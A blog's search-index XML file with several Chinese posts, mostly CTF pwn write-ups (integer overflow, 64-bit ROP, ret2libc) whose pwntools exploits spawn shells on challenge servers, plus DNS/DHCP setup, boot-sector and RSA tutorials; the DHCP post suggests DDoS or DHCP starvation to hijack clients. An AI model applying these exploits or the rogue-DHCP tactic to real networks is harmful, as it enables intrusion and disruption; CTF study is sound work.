<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>FairDivision(math)</title>
    <link href="/2021/03/17/FairDivision(math)/"/>
    <url>/2021/03/17/FairDivision(math)/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>#<a href="http://codeforces.com/contest/1472/problem/B" target="_blank" rel="noopener">Fair Division</a><br><img src="/images/16159692893675/16159693717142.jpg" alt="-w893"></p><p><img src="/images/16159692893675/16159694152159.jpg" alt="-w897"></p><p>solution:<br>1.总重量平分后判断是否为偶数<br>2.由于重量只有1和2，无论怎么分，两个人最后分到糖果的总量差距都不会超过1，所以当1的数量为2个以上都能平衡掉差距<br>3.奇数不好弥补因为需要1，但是偶数是通过2或者1都可以拼凑的，所以如果平分后的重量还是偶数，那么有没有1，最后都能补上了</p><p>code:</p><div class="hljs"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits\stdc++.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ll long long</span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> t;<span class="hljs-built_in">cin</span> &gt;&gt; t;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; t; i++) &#123;<span class="hljs-keyword">int</span> n, s, num;<span class="hljs-built_in">cin</span> &gt;&gt; n;s = <span class="hljs-number">0</span>;<span class="hljs-built_in">vector</span> &lt;<span class="hljs-keyword">int</span>&gt; a(n);<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<span class="hljs-built_in">cin</span> &gt;&gt; a[j];&#125;num = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;s += a[j];<span class="hljs-keyword">if</span> (a[j] == <span class="hljs-number">1</span>) &#123;num += <span class="hljs-number">1</span>;&#125;&#125;<span class="hljs-keyword">if</span> (s % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">if</span> ((s / <span class="hljs-number">2</span>) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> || num &gt;= <span class="hljs-number">2</span>) &#123;<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"YES"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"NO"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;&#125;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"NO"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;&#125;&#125;&#125;</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>无符号整数溢出攻击</title>
    <link href="/2020/12/10/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    <url>/2020/12/10/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="bugku-pwn11-无符号整数溢出攻击"><a href="#bugku-pwn11-无符号整数溢出攻击" class="headerlink" title="bugku pwn11 无符号整数溢出攻击"></a>bugku pwn11 无符号整数溢出攻击</h1><p>长度变量v2定义成无符号类型，所以可以通过溢出，让他为负值<br><img src="/images/16075435803355/16075436490784.jpg" alt="-w510"></p><p>长度溢出后，分别覆盖s字符数组、长度变量v2、循环i，特别注意是read(0,&amp;s[i],1u),每次循环读入单个字节<br><img src="/images/16075435803355/16075436987215.jpg" alt="-w497"></p><p>0x60<del>0x10覆盖数组，0x10</del>0xC都是覆盖长度变量(不管覆盖成多大都无所谓)，但是i必须要注意，read是通过s[i]来覆盖整个栈的，所以我们可以直接改变i的值，让i指向rip位置，也就是s往下98,i赋值为’c’就行，随之就是rip覆盖成getflag的起始地址就行了,hhh<br><img src="/images/16075435803355/16075448898467.jpg" alt="-w1350"></p><p>EXP:<br>from pwn import *</p><p>r = remote(“114.116.54.89”,10011)</p><p>r.recv()<br>r.sendline(“-1”)</p><p>payload = ‘a’*(0x60-0xc) + ‘c’ + p32(0x080486BB)</p><p>p.recv()<br>p.sendline(payload)<br>p.interactive()</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Bugku Pwn4(64位 ROP)</title>
    <link href="/2020/12/02/Bugku%20Pwn4(64%E4%BD%8D%20ROP)/"/>
    <url>/2020/12/02/Bugku%20Pwn4(64%E4%BD%8D%20ROP)/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Bugku-Pwn4-64位-ROP"><a href="#Bugku-Pwn4-64位-ROP" class="headerlink" title="Bugku Pwn4(64位 ROP)"></a>Bugku Pwn4(64位 ROP)</h1><p>没有开任何保护<br><img src="/images/16068424589387/16068426188639.jpg" alt="-w357"></p><p>反汇编很明显栈溢出<br><img src="/images/16068424589387/16068424960969.jpg" alt="-w947"><br><img src="/images/16068424589387/16068429194784.jpg" alt="-w486"></p><p>然而只有System函数地址是已知的(0x400570)，参数”/bin/sh”未知</p><p>发现有$0(代表bash,做参数等同于”/bin/sh”)<br><img src="/images/16068424589387/16068435653570.jpg" alt="-w1435"></p><p><strong>特别注意:</strong>32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用rdi、rsi、rdx、rcx、r8、r9来传递参数（参数个数小于7的时候）</p><p>所以我们要找一个能够pop rdi的指令通过这句ROPgadget –binary pwn4 –only “pop|ret”可以找到，地址为0x4007d3<br><img src="/images/16068424589387/16068436935190.jpg" alt="-w769"></p><p>用命令ROPgadget –binary pwn4 –string ‘$0’  找到$0的地址0x60111f<br><img src="/images/16068424589387/16068446893610.jpg" alt="-w649"></p><p>最后构造payload<br><img src="/images/16068424589387/16068447707177.jpg" alt="-w892"><br><img src="/images/16068424589387/16068448096858.jpg" alt="-w644"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DNS以及DHCP服务器的搭建</title>
    <link href="/2020/11/17/DNS%E4%BB%A5%E5%8F%8ADHCP%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/11/17/DNS%E4%BB%A5%E5%8F%8ADHCP%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="如何在Cent-OS-8-中配置DNS-以及-DHCP服务器的搭建"><a href="#如何在Cent-OS-8-中配置DNS-以及-DHCP服务器的搭建" class="headerlink" title="如何在Cent OS 8 中配置DNS 以及 DHCP服务器的搭建"></a>如何在Cent OS 8 中配置DNS 以及 DHCP服务器的搭建</h1><h1 id="DNS服务器的搭建"><a href="#DNS服务器的搭建" class="headerlink" title="DNS服务器的搭建:"></a>DNS服务器的搭建:</h1><p>环境的搭建:<br>安装bind<br>yum install bind-chroot -y</p><p>安装iptables-services<br>yum install iptables-services</p><p>关闭防火墙<br>systemctl stop firewalld    </p><p>gedit /etc/named.conf<br>进去改一下监听和allow-query<br>设置成any<br><img src="/images/16056266099042/16056270312019.jpg" alt="-w1023"></p><p>往下翻会有一个文件名叫做named.rfc1912.zones的文件，下一步需要修改它!<br><img src="/images/16056266099042/16056275266367.jpg" alt="-w452"></p><p>gedit /etc/named.rfc1912.zones<br>添加如下的配置,text.com文件是正向域名解析的，也就是把域名解析成ip的，而arpa是反向解析，把ip解析成域名的!<br><img src="/images/16056266099042/16056275991762.jpg" alt="-w386"></p><p>复制正向解析文件的模板<br>cp /var/named/named.localhost /var/named/text.com<br>以下是模板文件<br><img src="/images/16056266099042/16056277721620.jpg" alt="-w1016"></p><p>正向解析text.com<br>我们需要改下成下面这样(注意ip后面有”.”，第一次写容易掉!)<br><img src="/images/16056266099042/16056280614412.jpg" alt="-w1017"></p><p>反向解析192.168.1.arpa<br>与正向对应就行了，注意用IN PTR, 后面8位的数对应相应的前缀名,比如108对应ns，不要弄错!<br><img src="/images/16056266099042/16056281712073.jpg" alt="-w1023"></p><p><img src="/images/16056266099042/16056282155498.jpg" alt="-w620"></p><p>查看自己的ip(这里建议用NAT模式，因为考虑到桥接模式，dhcp租用的ip经常会换，不利于DNS实验)<br>10.211.55.15<br><img src="/images/16056266099042/16056284731017.jpg" alt="-w819"></p><p>named-checkconf -z /etc/named.conf<br>用来检查是否配置好了<br><img src="/images/16056266099042/16056374234653.jpg" alt="-w730"></p><p>配置好后接下来去把DNS修改成自己的ip就能用自己做的DNS服务器啦!<br>gedit /etc/resolv.conf<br><img src="/images/16056266099042/16056284243502.jpg" alt="-w1017"></p><p>service named start 启动DNS服务<br>service named stop 停止DNS服务<br>service named status 查看named状态<br>service named restart(你可能第一次配置不成功，如果用start后是不会重新开启的，restart少用一次stop哦!)<br><img src="/images/16056266099042/16056286412861.jpg" alt="-w1920"></p><p>nslookup</p><p>正向测试:<br>baidu.com和text.com都没问题<br><img src="/images/16056266099042/16056288256056.jpg" alt="-w900"></p><p>逆向测试:<br>127.0.0.1没有解析成text.com是因为localhost本身就是127.0.0.1，域名优先级要大于text.com的!逆向测试OK!<br><img src="/images/16056266099042/16056289879678.jpg" alt="-w603"></p><h1 id="DHCP服务器的搭建"><a href="#DHCP服务器的搭建" class="headerlink" title="DHCP服务器的搭建:"></a>DHCP服务器的搭建:</h1><p>实验前先切换到桥接模式或者NAT模式，下载安装dhcp服务包，Cent OS先yum update 然后直接输入dhcpd就会提示你安装，往下按y就是</p><p>切到主机模式(Only host)</p><p>查看主机ip，10.37.129.5<br><img src="/images/16056266099042/16056455571763.jpg" alt="-w841"></p><p>cp /usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample /etc/dhcp/dhcpd.conf<br>gedit /etc/dhcp/dhcpd.conf<br><strong>注意subnet必须要是同网段的!MAC地址设置成你要测试的虚拟机网卡MAC地址就行</strong></p><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-comment"># dhcpd.conf</span><span class="hljs-comment">#</span><span class="hljs-comment"># Sample configuration file for ISC dhcpd</span><span class="hljs-comment">#</span><span class="hljs-comment"># option definitions common to all supported networks...</span><span class="hljs-comment">#option domain-name "example.org";</span><span class="hljs-comment">#option domain-name-servers ns1.example.org, ns2.example.org;</span><span class="hljs-comment">#default-lease-time 600;</span><span class="hljs-comment">#max-lease-time 7200;</span><span class="hljs-comment"># Use this to enble / disable dynamic dns updates globally.</span><span class="hljs-comment">#ddns-update-style none;</span><span class="hljs-comment"># If this DHCP server is the official DHCP server for the local</span><span class="hljs-comment"># network, the authoritative directive should be uncommented.</span><span class="hljs-comment">#authoritative;</span><span class="hljs-comment"># Use this to send dhcp log messages to a different log file (you also</span><span class="hljs-comment"># have to hack syslog.conf to complete the redirection).</span><span class="hljs-string">log-facility</span> <span class="hljs-string">local7;</span><span class="hljs-comment"># No service will be given on this subnet, but declaring it helps the </span><span class="hljs-comment"># DHCP server to understand the network topology.</span><span class="hljs-comment">#subnet 10.152.187.0 netmask 255.255.255.0 &#123;</span><span class="hljs-comment">#&#125;</span><span class="hljs-comment"># This is a very basic subnet declaration.</span><span class="hljs-comment"># This declaration allows BOOTP clients to get dynamic addresses,</span><span class="hljs-comment"># which we don't really recommend.</span><span class="hljs-comment">#subnet 10.254.239.32 netmask 255.255.255.224 &#123;</span><span class="hljs-comment">#  range dynamic-bootp 10.254.239.40 10.254.239.60;</span><span class="hljs-comment">#  option broadcast-address 10.254.239.31;</span><span class="hljs-comment">#  option routers rtr-239-32-1.example.org;</span><span class="hljs-comment">#&#125;</span><span class="hljs-comment"># A slightly different configuration for an internal subnet.</span><span class="hljs-comment"># Hosts which require special configuration options can be listed in</span><span class="hljs-comment"># host statements.   If no address is specified, the address will be</span><span class="hljs-comment"># allocated dynamically (if possible), but the host-specific information</span><span class="hljs-comment"># will still come from the host declaration.</span><span class="hljs-comment"># Fixed IP addresses can also be specified for hosts.   These addresses</span><span class="hljs-comment"># should not also be listed as being available for dynamic assignment.</span><span class="hljs-comment"># Hosts for which fixed IP addresses have been specified can boot using</span><span class="hljs-comment"># BOOTP or DHCP.   Hosts for which no fixed address is specified can only</span><span class="hljs-comment"># be booted with DHCP, unless there is an address range on the subnet</span><span class="hljs-comment"># to which a BOOTP client is connected which has the dynamic-bootp flag</span><span class="hljs-comment"># set.</span><span class="hljs-comment"># You can declare a class of clients and then do address allocation</span><span class="hljs-comment"># based on that.   The example below shows a case where all clients</span><span class="hljs-comment"># in a certain class get addresses on the 10.17.224/24 subnet, and all</span><span class="hljs-comment"># other clients get addresses on the 10.0.29/24 subnet.</span><span class="hljs-string">option</span> <span class="hljs-string">domain-name</span> <span class="hljs-string">"text.lan"</span><span class="hljs-string">;</span><span class="hljs-string">option</span> <span class="hljs-string">domain-name-servers</span> <span class="hljs-string">ns1.text.lan,</span> <span class="hljs-string">ns2.text.lan;</span><span class="hljs-string">default-lease-time</span> <span class="hljs-number">3600</span><span class="hljs-string">;</span> <span class="hljs-string">max-lease-time</span> <span class="hljs-number">7200</span><span class="hljs-string">;</span><span class="hljs-string">authoritative;</span><span class="hljs-string">subnet</span> <span class="hljs-number">10.37</span><span class="hljs-number">.129</span><span class="hljs-number">.0</span> <span class="hljs-string">netmask</span> <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span> <span class="hljs-string">&#123;</span>        <span class="hljs-string">option</span> <span class="hljs-string">routers</span>                  <span class="hljs-number">10.37</span><span class="hljs-number">.129</span><span class="hljs-number">.1</span><span class="hljs-string">;</span>        <span class="hljs-string">option</span> <span class="hljs-string">subnet-mask</span>              <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><span class="hljs-string">;</span>        <span class="hljs-string">option</span> <span class="hljs-string">domain-search</span>            <span class="hljs-string">"tecmint.lan"</span><span class="hljs-string">;</span>        <span class="hljs-string">option</span> <span class="hljs-string">domain-name-servers</span>      <span class="hljs-number">10.37</span><span class="hljs-number">.129</span><span class="hljs-number">.1</span><span class="hljs-string">;</span>        <span class="hljs-string">range</span>   <span class="hljs-number">10.37</span><span class="hljs-number">.129</span><span class="hljs-number">.10</span>   <span class="hljs-number">10.37</span><span class="hljs-number">.129</span><span class="hljs-number">.100</span><span class="hljs-string">;</span>        <span class="hljs-string">range</span>   <span class="hljs-number">10.37</span><span class="hljs-number">.129</span><span class="hljs-number">.120</span>  <span class="hljs-number">10.37</span><span class="hljs-number">.129</span><span class="hljs-number">.200</span><span class="hljs-string">;</span><span class="hljs-string">&#125;</span><span class="hljs-string">host</span> <span class="hljs-string">ubuntu-node</span> <span class="hljs-string">&#123;</span> <span class="hljs-string">hardware</span>  <span class="hljs-string">ethernet</span> <span class="hljs-number">00</span><span class="hljs-string">:1c:42:04:60:07;</span> <span class="hljs-comment">#fixed-address 10.37.128.3;</span> <span class="hljs-string">&#125;</span><span class="hljs-comment">#</span></code></pre></div><p>设置监听网卡:<br><img src="/images/16056266099042/16056460945831.jpg" alt="-w1918"></p><p>display the Linux MAC address using following command.<br>ifconfig -a enp0s5 | grep HWaddr</p><p>Next, do not forget to permit DHCP service (DHCPD daemon listens on port 67/UDP) as below:<br>firewall-cmd –add-service=dhcp –permanent<br>firewall-cmd –reload </p><p>上步防火墙打开会遇到服务锁，使用下面命令即可解决:<br>systemctl unmask firewalld<br>下次需要锁定该服务时执行<br>systemctl mask firewalld</p><p>service dhcp start<br>service dhcp status<br>图下面的就是我监听的记录，只不过他们都不选择租我的QAQ<br><img src="/images/16056266099042/16056464987646.jpg" alt="-w1661"></p><p>如何使用自己搭建的DHCP服务给主机分配ip?<br>本人经过试验测试发现可以通过DDOS攻击路由或者手机热点的DHCP服务端口的方式来强制虚拟机、主机使用自己搭建好的DHCP服务,或者用DHCP攻击，让DHCP服务器的地址池耗尽枯竭也是可以的，否则很难抢赢虚拟机软件自带的DHCP和网关的DHCP服务</p><p>如果对网络攻击感兴趣的可以私聊哦</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>初识ROP(Return-Oriented Programming)    攻防世界 PWN level3</title>
    <link href="/2020/10/04/%E5%88%9D%E8%AF%86ROP(Return-Oriented%20Programming)%20%20%20%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20PWN%20level3/"/>
    <url>/2020/10/04/%E5%88%9D%E8%AF%86ROP(Return-Oriented%20Programming)%20%20%20%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20PWN%20level3/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="初识ROP-Return-Oriented-Programming-攻防世界-PWN-level3"><a href="#初识ROP-Return-Oriented-Programming-攻防世界-PWN-level3" class="headerlink" title="初识ROP(Return-Oriented Programming)    攻防世界 PWN level3"></a>初识ROP(Return-Oriented Programming)    攻防世界 PWN level3</h1><p>libc介绍<br>libc是Linux下的ANSI C的函数库。<br>ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。比如write函数等…</p><p>GOT和PLT的作用:<br>ELF文件中通常存在.GOT.PLT和.PLT这两个特殊的节，ELF编译时无法知道libc等动态链接库的加载地址。如果一个程序想调用动态链接库的函数，就必须使用.GOT.PLT和.PLT配合完成调用。<br>ELF中所有用到的外部动态链接库函数都会有对应的PLT项目<br>PLT表还是一段代码，作用是从内存中取出一个地址然后跳转。取出的地址便是函数的真实地址<br>.GOT.PLT表的初始化是在第一次调用该函数的过程中完成的，也就是说，某个函数必须被调用过，.GOT.PLT表中才会存放函数的真实地址</p><p>PIE保护:<br>让可执行程序ELF的地址进行随机化加载</p><p>strings -a -t x libc_32.so.6 | grep “/bin/sh”获取偏移<br>find / -name “内容*”</p><p>在linux中，&amp;和&amp;&amp;,|和||介绍如下：<br>&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;<br>&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo ‘1‘ &amp;&amp; echo ‘2’<br>| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo ‘yes’ | wc -l<br>|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo “fail”</p><p>p = process(“./level3”)<br>elf = ELF(“./level3”)<br>libc = ELF(“./libc_32.so.6”)</p><p>write_plt = elf.plt[‘write’]        //获取plt表中write地址<br>write_got = elf.got[‘write’]        //获取got表中write函数地址<br>main_addr = elf.symbols[‘main’]     //获取的.text中的main函数地址</p><p>查看保护<br><img src="/images/16017953896144/16020731437133.jpg" alt="-w702"></p><p>level3只开启了NX保护，而libc开启了Canary、NX、PIE保护<br>程序中没有现成的system函数。这就需要我们从libc中动态加载system函数。<br>初步思路：PIE没有开启，那么在libc中函数的offset就是固定的，只要确认了libc的base address，然后计算出system函数的offset，就可以定位到system函数的真实地址，实现调用。<br><img src="/images/16017953896144/16020897187885.jpg" alt="-w614"><br>很明显read函数栈溢出了<br><img src="/images/16017953896144/16020897316881.jpg" alt="-w478"></p><p>read函数时栈情况:<br><img src="/images/16017953896144/16020897769033.jpg" alt="-w872"><br><img src="/images/16017953896144/16020897904321.jpg" alt="-w462"></p><p>攻击思路:<br>第一步:首先通过read函数的栈溢出漏洞，调用一次write函数，这样就能够在plt.got表中有真实的地址，如何获得write函数的真实地址?因为可以通过栈溢出来调用write函数，知道它在plt表中的地址，<br>write(fd, buf, length)<br><img src="/images/16017953896144/16020886808381.jpg" alt="-w214"></p><p>从下面两个图不难看出offset aInput如果换成了offset write那不就可以读出write的got.plt地址了么,hhh<br><img src="/images/16017953896144/16020889940521.jpg" alt="-w559"><br><img src="/images/16017953896144/16020891030722.jpg" alt="-w651"><br>write函数栈内:<br><img src="/images/16017953896144/16020898566901.jpg" alt="-w592"><br>所以我们通过中间这个参数修改成write函数的got表地址就能读取write的got.plt表的地址了，记得第一次攻击后要回到主函数的地址，进行下一轮攻击</p><p>第二步:在获取了write的got.plt表之后我们接下来计算libc的基址,虽然PIE保护会把基地址随机化，但libc_32.so.6中的函数地址是固定的偏移量，所以我们通过将write的真实地址减去write的偏移量就是基地址了</p><p>第三步:计算出了libc的基地址后，其他的system和/bin/sh参数也就出来了，只需要将libc中的地址加上基地址就是了，不过/bin/sh得通过 命令strings -a -t x libc_32.so.6 | grep “/bin/sh”</p><p>第四步:把计算好的system栈溢出攻击完事!</p><p>这题我想了半天的重要要点:<br>1、每次栈溢出的攻击的开始，读入的时候就已经调用了会溢出的函数，而这个溢出的函数比如(read、gets等)已经压入了ebp，所以发现很多题每次开始都要覆盖ebp，而后面进行ROP的时候，调用其他函数就不需要手动覆盖ebp的操作了，因为调用的函数自己会对ebp压栈出栈，自动的!我只需要考虑返回地址填什么了!<br>2、通过覆盖栈的返回地址调用的函数是没有进行call的，所以攻击调用的函数地址后面要填上返回地址</p><p>Exploit:</p><div class="hljs"><pre><code class="hljs nix">from pwn <span class="hljs-built_in">import</span> *<span class="hljs-attr">r</span> = remote('<span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>', <span class="hljs-number">58311</span>)<span class="hljs-attr">elf</span> = ELF('./level3')   <span class="hljs-attr">libc</span> = ELF('./libc_32.so.<span class="hljs-number">6</span>')<span class="hljs-attr">write_plt</span> = elf.plt['write']    <span class="hljs-attr">write_got</span> = elf.got['write']<span class="hljs-attr">main_addr</span> = elf.symbols['main']<span class="hljs-attr">write_libc</span> = libc.symbols['write']<span class="hljs-attr">sys_libc</span> = libc.symbols['system']<span class="hljs-attr">bin_sh_libc</span> = <span class="hljs-number">0</span>x15902b          <span class="hljs-comment">#strings -a -t x libc_32.so.6 | grep "/bin/sh"找到sh的偏移</span><span class="hljs-comment">#第一次攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + write在plt表中的地址 + write返回时主函数地址 + write参数1fd + 要求的的offset write的地址 + 长度4  </span><span class="hljs-attr">payload1</span> = 'a'*<span class="hljs-number">0</span>x88 + p32(<span class="hljs-number">0</span>xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">0</span>x4)r.recv()r.sendline(payload1)<span class="hljs-attr">res</span> = r.recv()<span class="hljs-attr">write_addr</span> = u32(res[:<span class="hljs-number">4</span>])<span class="hljs-attr">base_libc</span> = write_addr - write_libc     <span class="hljs-comment">#计算PIE保护随机化后的基址</span><span class="hljs-attr">sys_addr</span> = base_libc + sys_libc<span class="hljs-attr">bin_sh_addr</span> = base_libc + bin_sh_libc<span class="hljs-comment">#第二次攻击攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + system调用地址 + 覆盖返回地址(随意) + "参数/bin/sh地址"</span><span class="hljs-attr">payload2</span> = 'a'*<span class="hljs-number">0</span>x88 + p32(<span class="hljs-number">0</span>xdeadbeef) + p32(sys_addr) + p32(<span class="hljs-number">0</span>xdeadbeef) + p32(bin_sh_addr)r.sendline(payload2)r.interactive()</code></pre></div><p><img src="/images/16017953896144/16020880129185.jpg" alt="-w803"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>编写主引导扇区程序</title>
    <link href="/2020/08/05/%E7%BC%96%E5%86%99%E4%B8%BB%E5%BC%95%E5%AF%BC%E6%89%87%E5%8C%BA%E7%A8%8B%E5%BA%8F/"/>
    <url>/2020/08/05/%E7%BC%96%E5%86%99%E4%B8%BB%E5%BC%95%E5%AF%BC%E6%89%87%E5%8C%BA%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1、编写主引导扇区程序"><a href="#1、编写主引导扇区程序" class="headerlink" title="1、编写主引导扇区程序"></a>1、编写主引导扇区程序</h1><p>test.asm</p><div class="hljs"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>, <span class="hljs-number">0x30</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>, <span class="hljs-number">0xC0</span><span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>, <span class="hljs-built_in">dx</span><span class="hljs-built_in">times</span> <span class="hljs-number">502</span> <span class="hljs-built_in">db</span> <span class="hljs-number">0</span><span class="hljs-built_in">db</span> <span class="hljs-number">0x55</span><span class="hljs-built_in">db</span> <span class="hljs-number">0xAA</span></code></pre></div><p>一个扇区有512个字节，前面一共是8个字节，后面有2个字节，中间就只需要填充502个字节了</p><p>对源程序进行编译:<code>nasm -f bin test.asm -o test.bin</code></p><p>test.bin的二进制如下:<br><strong>一个有效的主引导扇区程序，其最后的两个字节数据必须是0x55, 0xAA(规定的)</strong><br><img src="/images/15966052537008/15966466365373.jpg" alt="-w776"></p><h1 id="2、创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序"><a href="#2、创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序" class="headerlink" title="2、创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序"></a>2、创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序</h1><p>创建虚拟硬盘<br><img src="/images/15966052537008/15966481183480.jpg" alt="-w321"><br><img src="/images/15966052537008/15966481429916.jpg" alt="-w364"><br><img src="/images/15966052537008/15966481597613.jpg" alt="-w329"><br><img src="/images/15966052537008/15966482866631.jpg" alt="-w343"></p><p>查看刚刚创建的虚拟硬盘<br><img src="/images/15966052537008/15966497042265.jpg" alt="-w435"></p><p>把之前编译的bin文件写入到虚拟硬盘中<br><img src="/images/15966052537008/15966500646344.jpg" alt="-w672"></p><p><img src="/images/15966052537008/15966500796032.jpg" alt="-w667"></p><p>打开bochs，调好参数<br><img src="/images/15966052537008/15966495719491.jpg" alt="-w959"></p><p><img src="/images/15966052537008/15966498714018.jpg" alt="-w543"></p><p><img src="/images/15966052537008/15966499121719.jpg" alt="-w537"></p><h1 id="3、调试主引导扇区程序"><a href="#3、调试主引导扇区程序" class="headerlink" title="3、调试主引导扇区程序"></a>3、调试主引导扇区程序</h1><p>start后，左边是虚拟机调试窗口，右边是虚拟机的显示器<br><img src="/images/15966052537008/15966504839227.jpg" alt="-w1638"></p><p>Next at t=0<br>[0x0000fffffff0] f000:fff0 (unk. ctxt): jmpf 0xf000:e05b          ; ea5be000f0<br>t表示当前的内部时钟是0，下一条指令在此基础上执行然后依次是物理地址、逻辑地址、汇编指令、机器码<br>仔细看会发现，物理地址和逻辑地址是不一致的，这个原因以后再解释，只会出现在刚加电的时候</p><p><code>sreg</code>查看段寄存器内容<br><img src="/images/15966052537008/15966506764496.jpg" alt="-w990"></p><p><code>r</code>显示通用寄存器<br><img src="/images/15966052537008/15966507858163.jpg" alt="-w991"></p><p><code>s</code>单步执行<br><code>b</code>设置断点<br><code>c</code>执行到断点<br><img src="/images/15966052537008/15966510740872.jpg" alt="-w772"><br>执行完后发现右边的显卡已经初始化了,下一步执行 <code>mov ax, 0x0030</code>是我们之前写的程序的第一条命令<br><img src="/images/15966052537008/15966510582181.jpg" alt="-w1606"></p><p>继续往下发现都符合，主引扇区写入成功<br><img src="/images/15966052537008/15966512979613.jpg" alt="-w712"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RSA加密 --- 攻防世界 reverse Signin</title>
    <link href="/2020/08/03/RSA%E5%8A%A0%E5%AF%86%20---%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20reverse%20Signin/"/>
    <url>/2020/08/03/RSA%E5%8A%A0%E5%AF%86%20---%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20reverse%20Signin/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RSA加密-—-攻防世界-reverse-Signin"><a href="#RSA加密-—-攻防世界-reverse-Signin" class="headerlink" title="RSA加密 — 攻防世界 reverse Signin"></a>RSA加密 — 攻防世界 reverse Signin</h1><p>没有壳，是一个64位的ELF文件<br><img src="/images/15964645742488/15964646350054.jpg" alt="-w529"></p><p>ida逆向后发现是一个RSA加密的逆向题<br><img src="/images/15964645742488/15964647152829.jpg" alt="-w1211"></p><p><a href="https://www.cnblogs.com/pcheng/p/9629621.html" target="_blank" rel="noopener">&gt; RSA加密介绍</a><br><img src="/images/15964645742488/15964650086785.jpg" alt="-w1521"></p><p>首先分解大数103461035900816914121390101299049044413950405173712170434161686539878160984549<br>在线查询:<a 